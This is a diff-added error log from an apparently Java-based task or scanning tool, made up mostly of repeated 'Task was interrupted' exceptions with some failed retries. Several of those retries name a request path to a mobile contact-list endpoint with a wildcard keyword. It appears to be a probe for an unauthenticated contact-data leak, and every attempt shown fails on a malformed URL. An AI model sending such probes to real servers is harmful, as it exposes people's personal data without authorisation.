+2024-09-11 10:56:43  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:12 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:13 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:13 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:14 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:15 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:3 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:12 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:13 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:15 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:17 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:17 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:24 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:26 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:01:08  [ Thread-3:29 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:14 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:15 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:17 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:23 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:24 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:24 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:25 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:26 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:27 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:27 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:28 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:12  [ Thread-3:30 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21577 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21578 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21578 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21579 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21579 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21580 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21580 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21580 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21584 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21584 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21585 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21585 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:04:34  [ Thread-4:21586 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:05:15  [ Thread-5:63268 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 11:05:16  [ Thread-5:64270 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...2
+2024-09-11 11:05:17  [ Thread-5:65272 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...3
+2024-09-11 11:05:18  [ Thread-5:66273 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 11:05:18  [ Thread-5:66274 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:05:18  [ Thread-5:66275 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:05:18  [ Thread-5:66275 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:05:18  [ Thread-5:66276 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:05:18  [ Thread-5:66276 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:05:18  [ Thread-5:66277 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:05:18  [ Thread-5:66278 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:05:18  [ Thread-5:66278 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:2 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:3 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:13 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:15 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:15 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:17 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:20:23  [ Thread-3:23 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:09  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:09  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:09  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:09  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:09  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:09  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:09  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:09  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:10  [ Thread-3:14 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:10  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:10  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:10  [ Thread-3:17 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:10  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:10  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:21:10  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:27:28  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 11:27:29  [ Thread-3:1003 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...2
+2024-09-11 11:27:30  [ Thread-3:2004 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...3
+2024-09-11 11:27:31  [ Thread-3:3005 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 11:27:31  [ Thread-3:3006 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:27:31  [ Thread-3:3007 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:27:31  [ Thread-3:3007 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:27:31  [ Thread-3:3008 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:27:31  [ Thread-3:3008 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:27:31  [ Thread-3:3008 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:27:31  [ Thread-3:3009 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:27:31  [ Thread-3:3010 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:28:10  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 11:28:11  [ Thread-3:1003 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...2
+2024-09-11 11:28:12  [ Thread-3:2006 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...3
+2024-09-11 11:28:13  [ Thread-3:3008 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 11:28:13  [ Thread-3:3009 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:28:13  [ Thread-3:3010 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:28:13  [ Thread-3:3011 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:28:13  [ Thread-3:3011 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:28:13  [ Thread-3:3012 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:28:13  [ Thread-3:3013 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:28:13  [ Thread-3:3015 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:28:13  [ Thread-3:3017 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:31:21  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 11:31:22  [ Thread-3:1005 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...2
+2024-09-11 11:31:23  [ Thread-3:2006 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...3
+2024-09-11 11:31:24  [ Thread-3:3008 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 11:33:02  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 11:33:03  [ Thread-3:1004 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...2
+2024-09-11 11:33:04  [ Thread-3:2007 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...3
+2024-09-11 11:33:05  [ Thread-3:3009 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 11:33:08  [ Thread-3:5840 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 11:36:01  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 11:45:59  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 11:46:00  [ Thread-3:1003 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...2
+2024-09-11 11:46:01  [ Thread-3:2006 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...3
+2024-09-11 11:46:02  [ Thread-3:3006 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 14:07:04  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 14:07:05  [ Thread-3:1039 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...2
+2024-09-11 14:07:06  [ Thread-3:2041 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...3
+2024-09-11 14:07:07  [ Thread-3:3044 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 14:11:51  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 14:12:04  [ Thread-3:13374 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...1
+2024-09-11 14:12:05  [ Thread-3:14378 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...2
+2024-09-11 14:12:06  [ Thread-3:15379 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.net.MalformedURLException: no protocol: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 , retrying...3
+2024-09-11 14:12:07  [ Thread-3:16380 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 14:15:47  [ Thread-3:5 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:6 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:6 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:6 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:7 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:7 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:8 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:8 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:9 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:10 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:10 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:11 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:12 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:13 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:14 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:16 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:18 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:19 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:19 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:20 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:20 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:21 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:22 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:22 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:23 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:15:47  [ Thread-3:25 ] - [ ERROR ]  Interrupted exception: Task was interrupted
